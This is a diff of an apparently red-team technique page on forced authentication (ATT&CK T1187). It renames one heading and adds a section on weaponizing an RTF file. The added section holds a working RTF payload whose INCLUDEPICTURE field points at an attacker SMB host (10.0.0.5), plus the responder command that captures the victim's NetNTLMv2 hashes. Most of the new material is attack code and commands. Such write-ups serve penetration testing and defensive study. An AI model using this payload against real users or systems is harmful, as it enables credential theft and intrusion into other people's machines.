@@ -4,7 +4,7 @@ description: 'Credential Access, Stealing hashes'
 
 # T1187: Forced Authentication
 
-## Execution via Hyperlink to an SMB server
+## Execution via Hyperlink
 
 Let's create a Word document that has a hyperlink to our attacking server where  `responder` will be listening on port 445:
 
@@ -97,6 +97,32 @@ responder -I eth1 -v
 Once the victim navigates to the C:\ where `link.url` file is placed, the OS tries to authenticate to the attacker's malicious SMB listener on `10.0.0.5` where NetNTLMv2 hash is captured:
 
 ![](../.gitbook/assets/forced-authentication-url.gif)
+
+## Execution via .RTF
+
+Weaponizing .rtf file, which will attempt to load an image from the attacking system:
+
+{% code-tabs %}
+{% code-tabs-item title="file.rtf" %}
+```csharp
+{\rtf1{\field{\*\fldinst {INCLUDEPICTURE "file://10.0.0.5/test.jpg" \\* MERGEFORMAT\\d}}{\fldrslt}}}
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+Starting authentication listener on the attacking system:
+
+{% code-tabs %}
+{% code-tabs-item title="attacker@local" %}
+```text
+responder -I eth1 -v
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+Executing the file.rtf on the victim system gives away user's hashes:
+
+![](../.gitbook/assets/rtf-hashes.gif)
 
 ## References
 
